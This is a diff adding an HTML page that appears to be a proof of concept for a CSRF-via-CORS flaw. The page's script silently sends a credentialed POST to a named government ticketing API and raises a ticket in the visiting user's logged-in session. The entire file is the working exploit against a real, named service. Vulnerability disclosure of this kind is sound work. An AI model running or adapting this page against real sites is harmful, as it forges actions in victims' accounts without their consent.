@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch("https://sbis.hrsd.gov.sa/api/tickets-management/portal/raise-ticket", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    "program": { "id": 1 },
+    "caseCategory": { "id": 5 },
+    "caseSubCategory": { "id": 11 },
+    "description": "CSRF via CORS – ticket created without user consent"
+  })
+});
+</script>
+</body>
+</html>
